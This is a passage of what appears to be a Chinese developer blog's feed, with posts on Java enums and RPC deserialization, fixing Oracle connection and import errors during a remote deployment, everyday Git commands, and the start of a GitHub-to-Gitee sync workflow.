class="keyword">static</span> SeasonEnum[] values() &#123;</span><br><span class="line">    <span class="keyword">return</span> $VALUES.clone();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br/></p><p> 🥝compareTo()</p><ul><li><p>该方法用来比较两个枚举值的<code>ordinal</code>值，即枚举值的定义序号</p></li><li><p>观察Enum源码， Enum实现了Comparable接口，而 Comparable 接口中只有一个函数声明，即Enum重写compareTo函数。可以看到，先判断是不是同一个枚举类的变量，再返回当前枚举值和传递的枚举值差值。    </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">compareTo</span><span class="params">(E o)</span> &#123;</span><br><span class="line">    Enum&lt;?&gt; other = (Enum&lt;?&gt;)o;</span><br><span class="line">    Enum&lt;E&gt; self = <span class="built_in">this</span>;</span><br><span class="line">    <span class="keyword">if</span> (self.getClass() != other.getClass() &amp;&amp; <span class="comment">// optimization</span></span><br><span class="line">        self.getDeclaringClass() != other.getDeclaringClass())</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassCastException</span>();</span><br><span class="line">    <span class="keyword">return</span> self.ordinal - other.ordinal;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Season</span> <span class="variable">summer</span> <span class="operator">=</span> Season.valueOf(<span class="string">&quot;SUMMER&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(Season s : Season.values())&#123;</span><br><span class="line">    System.out.print(summer.name()+<span class="string">&quot; compare to &quot;</span>+s.name());</span><br><span class="line">    System.out.println(<span class="string">&quot; result: &quot;</span>+summer.compareTo(s));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 返回正数表示当前对象较大，0 表示大小相等，负数表示当前对象较小，差值表示声明顺序的差距大小。</span></span><br><span class="line">SUMMER compare to SPRING result: <span class="number">1</span></span><br><span class="line">SUMMER compare to SUMMER result: <span class="number">0</span></span><br><span class="line">SUMMER compare to AUTUMN result: -<span class="number">1</span></span><br><span class="line">SUMMER compare to WINTER result: -<span class="number">2</span></span><br></pre></td></tr></table></figure></li></ul><p><br/></p><h3 id="⭐业务场景举例"><a href="#⭐业务场景举例" class="headerlink" title="⭐业务场景举例"></a>⭐业务场景举例</h3><blockquote><ul><li><strong>星期：</strong> Monday（星期一）、Tuesday（星期二）、Wednesday（星期三）、Thursday（星期四）、Firday（星期五）、Saturday（星期六）、Sunday（星期日）</li><li><strong>性别：</strong> Man（男）、Woman（女）</li><li><strong>季节：</strong> Spring（春天）、Summer（夏天）、Autumn（秋天）、Winter（冬天）</li><li><strong>支付方式：</strong> Cash（现金）、WeChatPay（微信）、Alipay（支付宝）、BankCard（银行卡）、CreditCard（信用卡）</li><li><strong>订单状态：</strong> Nonpayment（未付款）、Paid（已付款）、Fulfilled（已配货）、Delivered（已发货）、Return（退货）、Checked（已确认）</li><li><strong>线程状态：</strong> Establish（创建）、Ready（就绪）、Run（运行）、Obstruct（阻塞）、Die（死亡）</li></ul></blockquote><p><br/></p><h3 id="⭐注意事项"><a href="#⭐注意事项" class="headerlink" title="⭐注意事项"></a>⭐注意事项</h3><p> 🥝阿里巴巴开发手册关于枚举建议（1.4.0）</p><ul><li><img src="https://pic.baicai.icu/枚举.assets/阿里巴巴开发手册-枚举3.png" alt="阿里巴巴开发手册-枚举3"></li></ul><p><br/></p><p> 🥝二方库释义</p><blockquote><p>一方库指的是本项目中的依赖</p><p>二方库指的是公司内部其他项目提供的依赖</p><p>三方库指的是其他组织、公司等来自第三方的依赖</p></blockquote><p><br/></p><p> 🥝为什么不建议接口的返回值包含枚举类型呢？</p><ul><li><p>假设有一个二方库，A系统和B系统都依赖了该二方库，同时B系统通过RPC远程调用A系统的一个接口（该接口中返回值中有一个参数类型是枚举类型）    </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 二方库中的枚举</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">AType</span>&#123;</span><br><span class="line">    P_T,</span><br><span class="line">    A_B</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A系统</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">AService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> AResponse <span class="title function_">doSth</span><span class="params">(ARequest aRequest)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Class AResponse&#123;</span><br><span class="line">    <span class="keyword">private</span> Boolean success;</span><br><span class="line">    <span class="comment">// 返回值包括了枚举</span></span><br><span class="line">    <span class="keyword">private</span> AType aType;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// B系统</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BService</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    AService aService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doSth</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">ARequest</span> <span class="variable">aRequest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ARequest</span>();</span><br><span class="line">        <span class="type">AResponse</span> <span class="variable">aResponse</span> <span class="operator">=</span> aService.doSth(aRequest);</span><br><span class="line">        <span class="type">AType</span> <span class="variable">aType</span> <span class="operator">=</span> aResponse.getAType();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br/></p><ul><li><p>当两个使用同一个枚举的时候是不会出现问题的，即在原来的二方库上可以继续使用。但在某天，二方库中的枚举进行了升级，A系统也跟着升级，而B系统并没有跟着升级，即    </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 二方库中的枚举，也是A系统的枚举</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">AType</span>&#123;</span><br><span class="line">    P_T,</span><br><span class="line">    A_B,</span><br><span class="line">    P_M</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// B系统的枚举</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">AType</span>&#123;</span><br><span class="line">    P_T,</span><br><span class="line">    A_B,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong><font color="#ef7050">「这种情况下，在B系统通过RPC调用A系统的时候，如果A系统返回的AResponse中的aType的类型为新增的P_M时候，B系统就会无法解析。一般在这种时候，RPC框架就会发生反序列化异常。导致程序被中断。」</font></strong></p></li></ul><p><br/></p><p> 🥝RPC反序列化枚举异常分析</p><ul><li>RPC框架大多数会采用JSON的格式进行数据传输，也就是客户端会将返回值序列化成JSON字符串，而服务端会再将JSON字符串反序列化成一个Java对象。</li><li>而JSON在反序列化的过程中，对于一个枚举类型，会尝试调用对应的枚举类的valueOf方法来获取到对应的枚举。</li><li>如果从枚举类中找不到对应的枚举项的时候，就会抛出<a href="#IllegalArgumentException">IllegalArgumentException</a>，这也是为什么阿里巴巴不推荐在接口的返回值中包含二方库枚举值的原因</li></ul><p><br/></p><h3 id="⭐小结"><a href="#⭐小结" class="headerlink" title="⭐小结"></a>⭐小结</h3><ul><li><p>总的来说，枚举在代码设计可以体现为，语义化地代表词典并作为一个独立的引用类型存在。</p></li><li><p>如果担心枚举使用不当，可以使用字符串常量来代表字典，这个是最常见的一刀切方式。例如上述中RPC反序列化异常的问题，如果使用字符串代替RPC接口中的枚举，那么B系统只需要传递字符串就行，至于传递的值的合法性，只需要在A系统内进行校验就可以了。</p></li><li>但是笔者觉得这种投鼠忌器的方式不太好，尽管枚举可能会带来扩展兼容性的问题，我们应当做的是避免出现扩展兼容性的问题（即按照阿里巴巴推荐方式）。对于单体项目或者需要快速迭代的项目，枚举便利性收益是大于兼容性的。</li></ul><p><br/></p><h3 id="📚参考文档"><a href="#📚参考文档" class="headerlink" title="📚参考文档"></a>📚参考文档</h3><ul><li><a href="https://developer.aliyun.com/article/665108">Java枚举类型enum - 阿里云开发者社区</a></li><li><a href="https://www.bilibili.com/video/BV1A34y1v7aL?spm_id_from=333.337.search-card.all.click">都有常量了，为啥还要用枚举？ - 哔哩哔哩</a></li><li><a href="https://blog.51cto.com/u_11440114/5102212">一文看懂Java的枚举 - 51CTO博客</a></li><li><a href="https://developer.aliyun.com/special/tech-java">Java开发手册 - 阿里云开发者社区</a></li><li><a href="https://mp.weixin.qq.com/s/LJuE9cH2FrwN6-1qEud6LA">求你了，不要再在对外接口中使用枚举类型了！- Hollis - 公众号</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;⭐什么是枚举&quot;&gt;&lt;a href=&quot;#⭐什么是枚举&quot; class=&quot;headerlink&quot; title=&quot;⭐什么是枚举&quot;&gt;&lt;/a&gt;⭐什么是枚举&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;中文的释义，指的是可以一个一个列举&lt;/li&gt;
&lt;li&gt;&lt;p&gt;即在一个特定的范围内，有穷的集合，如</summary>
      
    
    
    
    <category term="技术" scheme="https://baicai.icu/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="Java技术点" scheme="https://baicai.icu/tags/Java%E6%8A%80%E6%9C%AF%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>记一次部署传统项目遇到Oracle数据库的坑</title>
    <link href="https://baicai.icu/posts/fc0c0f34.html"/>
    <id>https://baicai.icu/posts/fc0c0f34.html</id>
    <published>2022-04-15T18:39:56.000Z</published>
    <updated>2022-12-06T18:49:20.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="⭐背景"><a href="#⭐背景" class="headerlink" title="⭐背景"></a>⭐背景</h3><ul><li>本来计划上一周到客户现场部署的，由于疫情的原因，所以跟客户商量了远程部署。于是客户那边帮我们弄了一个<em>Windows Server</em>，在此<em>window</em>上再去连接客户内网的<em>Linux</em>。又由于客户锁了IP，只能使用客户提供的VPN访问<code>Windows Server</code>，所以整个部署环境是ping不到外网的。</li></ul><p><br></p><h3 id="⭐Navicat登录问题"><a href="#⭐Navicat登录问题" class="headerlink" title="⭐Navicat登录问题"></a>⭐Navicat登录问题</h3><h4 id="🥝oracle-library-is-not-load"><a href="#🥝oracle-library-is-not-load" class="headerlink" title="🥝oracle library is not load"></a>🥝oracle library is not load</h4><ul><li><img src="http://pic.baicai.icu/记一次部署传统项目遇到Oracle数据库的坑.assets/1.jpg" alt="1" style="zoom:33%;" /></li></ul><ul><li><p>原因：由于安装Navicat的时候，没有<em>Windows Serverw</em>管理员的权限，所以导致了Navicat安装的时候丢失了部分dll文件，而这部分dll文件就是Oracle在window环境运行时所需要依赖的文件。</p></li><li><p>解决办法：找到对应Navicat版本的dll环境，<code>工具 - 选项 - 环境 - OCI环境，选择Oracle bin 目录下的 oci.dll</code>。<font color="red">需要注意的是，设置完了之后必须重启Navicat</font></p><ul><li><img src="http://pic.baicai.icu/记一次部署传统项目遇到Oracle数据库的坑.assets/2.png" alt="2" style="zoom:43%;" /></li></ul></li></ul><p><br></p><h4 id="🥝应当以-SYSDBA-身份或-SYSOPER-身份建立-SYS-连接"><a href="#🥝应当以-SYSDBA-身份或-SYSOPER-身份建立-SYS-连接" class="headerlink" title="🥝应当以 SYSDBA 身份或 SYSOPER 身份建立 SYS 连接"></a>🥝应当以 SYSDBA 身份或 SYSOPER 身份建立 SYS 连接</h4><ul><li>错误：<code>ORA-28009: 应当以 SYSDBA 身份或 SYSOPER 身份建立 SYS 连接</code><ul><li><img src="http://pic.baicai.icu/记一次部署传统项目遇到Oracle数据库的坑.assets/3.png" alt="3" style="zoom:43%;" /></li></ul></li></ul><ul><li><p>原因：因为客户给的Oracle数据库用户是sys，所以需要使用管理员方式登录</p></li><li><p>解决办法：选择管理员方式登录</p><ul><li><img src="http://pic.baicai.icu/记一次部署传统项目遇到Oracle数据库的坑.assets/4.png" alt="4" style="zoom:43%;" /></li></ul></li></ul><p><br></p><h3 id="⭐SQL文件"><a href="#⭐SQL文件" class="headerlink" title="⭐SQL文件"></a>⭐SQL文件</h3><ul><li>背景：因为需要将开发的数据库导入到客户的数据库，而开发的数据库在我们公司的内网，而客户又锁了IP，所以没办法使用Navicat的数据同步，只能通过sql文件来传输数据</li></ul><p><br></p><h4 id="🥝table-or-view-does-not-exist"><a href="#🥝table-or-view-does-not-exist" class="headerlink" title="🥝table or view does not exist"></a>🥝table or view does not exist</h4><ul><li>问题：<code>[ERR] ORA-00942: table or view does not exist</code><ul><li><img src="http://pic.baicai.icu/记一次部署传统项目遇到Oracle数据库的坑.assets/5.png" alt="5" style="zoom:50%;" /></li></ul></li><li><p>原因：因为Oracle<strong>导入</strong>的时候以防万一存在相同的表，所以<strong>导出</strong>sql文件中的语句是先删除该表再创建，所以第一次创建时候会报找不到需要删除的表的错误</p><ul><li><img src="http://pic.baicai.icu/记一次部署传统项目遇到Oracle数据库的坑.assets/7.png" alt="7" style="zoom:43%;" /></li></ul></li><li><p>解决办法：在sql文件中选择性注释DROP语句</p></li></ul><p><br></p><h4 id="🥝表空间不存在"><a href="#🥝表空间不存在" class="headerlink" title="🥝表空间不存在"></a>🥝表空间不存在</h4><ul><li><p>问题：<code>ORA-00959:表空间不存在</code></p><ul><li><img src="http://pic.baicai.icu/记一次部署传统项目遇到Oracle数据库的坑.assets/8.png" alt="8" style="zoom:43%;" /></li></ul></li><li><p>原因：猜测可能是因为sql文件中写了<code>YXG2_DATA</code>作为表空间，而客户数据库上没有这个表空间</p></li><li>解决办法：需要在客户的数据库上，创建与开发环境一致的表空间名字，即<code>YXG2_DATA</code></li></ul><p><br></p><h3 id="⭐Oracle驱动问题"><a href="#⭐Oracle驱动问题" class="headerlink" title="⭐Oracle驱动问题"></a>⭐Oracle驱动问题</h3><ul><li><p>背景：由于开发环境的Oracle11，而客户使用的Oracle19</p></li><li><p>问题：<code>ORA-28040: 没有匹配的验证协议</code></p><ul><li><img src="http://pic.baicai.icu/记一次部署传统项目遇到Oracle数据库的坑.assets/10.jpg" alt="10"></li></ul></li><li><p>原因：项目pom文件中的Oracle驱动低于Oracle19要求的版本，所以需要更新坐标</p></li><li><p>解决办法：导入maven坐标</p><ul><li><p><a href="https://mvnrepository.com/artifact/com.oracle.database.jdbc/ojdbc8">maven中央仓库地址：Oracle JDBC Driver compatible with JDK8, JDK11, JDK12, JDK13, JDK14 and JDK15</a></p></li><li><p>我选择的是<code>19.6.0.0</code>    </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.oracle.database.jdbc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ojdbc8<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>19.6.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>小结</p><ul><li>一开始怀疑是本地maven仓库的Oracle驱动jar包版本不够高，所以使用命令将jar包导入到本地maven仓库，然后发现还是不行，后面才想起pom文件没有修改对应的坐标。于是去中央仓库搜了下，Oracle现在居然在maven中央仓库开放了驱动！！！直接导入坐标就可以下载了。</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;⭐背景&quot;&gt;&lt;a href=&quot;#⭐背景&quot; class=&quot;headerlink&quot; title=&quot;⭐背景&quot;&gt;&lt;/a&gt;⭐背景&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;本来计划上一周到客户现场部署的，由于疫情的原因，所以跟客户商量了远程部署。于是客户那边帮我们弄了一个&lt;em&gt;Window</summary>
      
    
    
    
    <category term="技术" scheme="https://baicai.icu/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="ORM" scheme="https://baicai.icu/tags/ORM/"/>
    
  </entry>
  
  <entry>
    <title>Git常用命令</title>
    <link href="https://baicai.icu/posts/caff8000.html"/>
    <id>https://baicai.icu/posts/caff8000.html</id>
    <published>2022-04-11T18:39:56.000Z</published>
    <updated>2022-12-06T18:49:20.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="⭐本地仓库"><a href="#⭐本地仓库" class="headerlink" title="⭐本地仓库"></a>⭐本地仓库</h3><p>🥝设置用户信息</p><ul><li>用户名：<code>git config --global user.name &quot;Ethan&quot;</code></li><li>邮箱：<code>git config --global user.email &quot;123@qq.com&quot;</code></li></ul><p><br/></p><p>🥝查看配置信息</p><ul><li>查看用户名：<code>git config --global user.name</code></li><li>查看邮箱：<code>git config --global user.email</code></li></ul><p><br/></p><p>🥝创建本地仓库：<code>git init</code></p><p><br/></p><p>🥝查看的修改的状态（暂存区、工作区）：<code>git status</code></p><p><br/></p><p>🥝添加工作区到暂存区(add)</p><ul><li>格式：<code>git add 单个文件名|通配符</code></li><li>将所有修改加入暂存区：<code>git add .</code></li><li>如果想忽略某些文件，可以在分支下创建一个名为<code>.gitignore</code>的文件，文件内使用配置忽略的文件名</li></ul><p><br/></p><p>🥝提交暂存区到本地仓库(commit）</p><ul><li>作用：提交暂存区内容到本地仓库的当前分支</li><li>格式：<code>git commit -m &#39;注释内容&#39;</code></li></ul><p><br/></p><p>🥝查看提交日志(log)</p><ul><li><p>格式：<code>git log [option]</code></p><ul><li>options<ul><li>—all 显示所有分支</li><li>—pretty=oneline 将提交信息显示为一行</li><li>—abbrev-commit 使得输出的commitId更简短</li><li>—graph 以图的形式显示</li></ul></li></ul></li><li><p>使用别名进行简写查看</p><ul><li><p>在用户目录，创建 .bashrc 文件，添加如下内容</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用于输出git提交日志</span></span><br><span class="line"><span class="attr">alias</span> <span class="string">git-log=&#x27;git log --pretty=oneline --all --graph --abbrev-commit&#x27;</span></span><br><span class="line"><span class="comment">#用于输出当前目录所有文件及基本信息</span></span><br><span class="line"><span class="attr">alias</span> <span class="string">ll=&#x27;ls -al&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>使用<code>git-log</code>命令即可进行简写查看</p></li></ul></li></ul><p><br/></p><p>🥝版本回退：<code>git reset --hard commitID</code></p><p><br/></p><p>🥝查看本地分支：<code>git branch</code></p><p><br/></p><p>🥝创建本地分支：<code>git branch 分支名</code></p><p><br/></p><p>🥝切换分支：<code>git checkout 分支名</code></p><p><br/></p><p>🥝切换到一个不存在的分支（创建并切换）：<code>git checkout -b 分支名</code></p><p><br/></p><p>🥝合并分支(merge)：<code>git merge 分支名称</code></p><ul><li>合并的前提切换到指定分支</li></ul><p><br/></p><p>🥝删除分支</p><ul><li>删除分支时，需要做各种检查：<code>git branch -d b1</code></li><li>不做任何检查，强制删除：<code>git branch -D b1</code> </li></ul><p>🥝解决冲突</p><ul><li>当两个分支上对文件的修改可能会存在冲突，例如同时修改了同一个文件的同一行，这时就需要手动解 决冲突，解决冲突步骤如下<ul><li>.处理文件中冲突的地方</li><li>将解决完冲突的文件加入暂存区(add)</li><li>提交到仓库(commit)</li></ul></li></ul><p><br/></p><h3 id="⭐远程仓库"><a href="#⭐远程仓库" class="headerlink" title="⭐远程仓库"></a>⭐远程仓库</h3><p>🥝指定远程仓库</p><ul><li>格式：<code>git remote add &lt;远端名称&gt; &lt;仓库路径&gt;</code></li><li>示例：<code>git remote add origin https://github.com/Ethan-0822/git_test.git</code><ul><li>一般约定俗成都将远程仓库名字改成origin</li></ul></li></ul><p><br/></p><p>🥝查看远程仓库：<code>git remote</code></p><p><br/></p><p>🥝推送到远程仓库</p><ul><li>格式：<code>git push [-f] [--set-upstream] [远端名称 [本地分支名][:远端分支名] ]</code></li><li>如果远程分支名和本地分支名称相同，则可以只写本地分支<ul><li>示例：<code>git push origin master</code></li></ul></li><li><code>-f</code> 表示强制覆盖，以本次推送为基准</li><li><p><code>--set-upstream</code> 推送到远端的同时并且建立起和远端分支的关联关系</p><ul><li>示例：<code>git push --set-upstream origin master:master</code></li></ul></li><li><p>如果当前分支已经和远端分支关联，则可以省略分支名和远端名</p><ul><li>git push 将master分支推送到已关联的远端分支</li></ul></li></ul><p><br/></p><p>🥝查看本地分支与远程分支的关联关系：<code>git branch -vv</code></p><p><br/></p><p>🥝从远程仓库克隆</p><ul><li>格式：<code>git clone &lt;仓库路径&gt; [本地目录]</code><ul><li>本地目录可以省略，会根据下载地址的后缀自动生成一个目录</li></ul></li></ul><p><br/></p><p>🥝从远程仓库中抓取</p><ul><li>抓取指令就是将仓库里的更新都抓取到本地，不会进行合并，所以可以使用该命令查看远程和本地哪个版本更新<ul><li>如果不指定远端名称和分支名，则抓取所有分支</li><li>抓取命令：<code>git fetch [remote name] [branch name]</code></li></ul></li></ul><p><br/></p><p>🥝从远程仓库中拉取</p><ul><li>拉取指令就是将远端仓库的修改拉到本地并自动进行合并，等同于fetch+merge<ul><li>如果不指定远端名称和分支名，则抓取所有并更新当前分支。</li><li>拉取命令：<code>git pull [remote name] [branch name]</code></li></ul></li></ul><p><br/></p><p>🥝解决合并冲突</p><ul><li>原因：在一段时间，A、B用户修改了同一个文件，且修改了同一行位置的代码，此时会发生合并冲突。</li><li>由于是A先提交，B后提交<strong><font color="#ef7050">「A是不可能知道B提交了什么」</font></strong>，所以后提交的需要去处理冲突，解决完后重新推动远端，然后先提交的人再拉取一遍</li></ul><p><br/></p><h3 id="⭐在Idea中使用Git"><a href="#⭐在Idea中使用Git" class="headerlink" title="⭐在Idea中使用Git"></a>⭐在Idea中使用Git</h3><p>🥝在Idea中配置Git</p><ul><li>打开idea设置，找到git设置，如果是默认安装目录，直接test就能通过检查</li></ul><p><br/></p><p>🥝初始化本地仓库</p><ul><li>在左上角的VCS中，找到<code>导入到版本控制</code>，选择文件夹为git仓库目录即可</li><li><img src="http://pic.baicai.icu/Git常用命令.assets/导入版本库.png" alt="导入版本库"></li></ul><p><br/></p><p>🥝设置远程仓库</p><ul><li><img src="http://pic.baicai.icu/Git常用命令.assets/设置远程仓库.png" alt="设置远程仓库"></li><li><img src="http://pic.baicai.icu/Git常用命令.assets/设置远程仓库_url.png" alt="设置远程仓库_url"></li><li>其实远程仓库的地址需要设置为ssh登录</li></ul><p><br/></p><p>🥝提交到本地仓库</p><ul><li>点击右上角的绿色钩子✔就会弹出该窗口，当出现新改动时，测试窗口会出现提交选择项和按钮。<ul><li><img src="http://pic.baicai.icu/Git常用命令.assets/提交分支.png" alt="提交分支"></li></ul></li></ul><ul><li>提交完成后会展示远端和本地分支的版本先后顺序（还没有推送到远端）<ul><li><img src="http://pic.baicai.icu/Git常用命令.assets/远端和本地分支的版本.png" alt="远端和本地分支的版本"></li></ul></li></ul><p><br/></p><p>🥝推送到远程仓库</p><ul><li>4种方法</li><li>快捷键<code>ctrl + shift +k</code></li><li><img src="http://pic.baicai.icu/Git常用命令.assets/推送到远程仓库.png" alt="推送到远程仓库"></li><li><p><img src="http://pic.baicai.icu/Git常用命令.assets/推送到远端.png" alt="推送到远端"></p></li><li><p><img src="http://pic.baicai.icu/Git常用命令.assets/推送到远端1.png" alt="推送到远端1"></p></li><li><p><img src="http://pic.baicai.icu/Git常用命令.assets/推送后.png" alt="推送后"></p></li></ul><p><br/></p><p>🥝克隆远程仓库到本地</p><ul><li><img src="http://pic.baicai.icu/Git常用命令.assets/克隆按钮.png" alt="克隆按钮"></li></ul><p><br/></p><p>🥝创建分支</p><ul><li>在日志选中分支就能在该分支下，创建新的分支，默认创建完分支后自动切换到当前分支。如果需要删除该分支，切换到其他分支就能出现删除按钮</li><li><img src="http://pic.baicai.icu/Git常用命令.assets/创建分支.png" alt="创建分支"></li></ul><p><br/></p><p>🥝切换分支</p><ul><li><p>当前分支名字</p><ul><li><img src="http://pic.baicai.icu/Git常用命令.assets/当前分支.png" alt="当前分支"></li></ul></li><li><p>切换分支按钮</p><ul><li><img src="http://pic.baicai.icu/Git常用命令.assets/切换分支按钮.png" alt="切换分支按钮"></li></ul></li></ul><p><br/></p><p>🥝解决冲突</p><ul><li>冲突出现的原因：当远端和本地发生冲突时，本地虽然提交到本地仓库，但是推送不到远端，需要解决冲突后，解决完后重新推动远端<ul><li>可以选择idea解决冲突，也可以手动编写代码解决冲突，当手动的方式需要将该文件放入暂存区才能提交到本地仓库</li></ul></li></ul><p><br/></p><p>🥝小结</p><ul><li>蓝色箭头↙是<code>git pull</code>，绿色钩子✔是<code>git commit</code></li></ul><p><br/></p><p>❗注意事项</p><ul><li><strong>切换分支前先必须提交本地的修改，否则代码保存不了</strong></li><li><strong>代码及时提交，提交过了就不会丢</strong></li></ul><p><br/></p><h3 id="⭐总结"><a href="#⭐总结" class="headerlink" title="⭐总结"></a>⭐总结</h3><p>🥝IDEA集成GitBash作为Terminal</p><ul><li><p><img src="http://pic.baicai.icu/Git常用命令.assets/设置为git的终端.png" alt="设置为git的终端"></p></li><li><p><img src="http://pic.baicai.icu/Git常用命令.assets/启动终端命令.png" alt="启动终端命令"></p></li></ul><p><br/></p><p>🥝Git工作流程</p><ul><li><img src="http://pic.baicai.icu/Git常用命令.assets/git工作流程.png" alt="git工作流程"></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;⭐本地仓库&quot;&gt;&lt;a href=&quot;#⭐本地仓库&quot; class=&quot;headerlink&quot; title=&quot;⭐本地仓库&quot;&gt;&lt;/a&gt;⭐本地仓库&lt;/h3&gt;&lt;p&gt;🥝设置用户信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户名：&lt;code&gt;git config --global user.n</summary>
      
    
    
    
    <category term="技术" scheme="https://baicai.icu/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="GitHub仓库" scheme="https://baicai.icu/tags/GitHub%E4%BB%93%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>Github仓库自动同步到Gitee仓库</title>
    <link href="https://baicai.icu/posts/e49bd23b.html"/>
    <id>https://baicai.icu/posts/e49bd23b.html</id>
    <published>2022-04-06T18:39:56.000Z</published>
    <updated>2022-12-06T18:49:20.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="⭐创建自己工作流"><a href="#⭐创建自己工作流" class="headerlink" title="⭐创建自己工作流"></a>⭐创建自己工作流</h3><ul><li>打开Github仓库，在<code>Actions</code>创建自己的工作流<ul><li><img src="http://pic.baicai.icu/Github自动将代码同步到Gitee.assets/新建工作流程.png" alt="新建工作流程"></li><li><img src="http://pic.baicai.icu/Github自动将代码同步到Gitee.assets/设置自己的工作流程.png" alt="设置自己的工作流程"></li></ul></li></ul><h3 id="⭐创建工作流脚本"><a href="#⭐创建工作流脚本" class="headerlink" title="⭐创建工作流脚本"></a>⭐创建工作流脚本</h3><ul><li><p>工作流脚本在仓库的路径为<code>.github/workflows/xxx.yml</code>，设置的具体脚本内容如下</p><ul><li><p>脚本将使用<code>Yikun/hub-mirror-action@master</code>的同步脚本，<a href="https://github.com/Yikun/hub-mirror-action">点击跳转同步脚本的Github地址</a>    </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 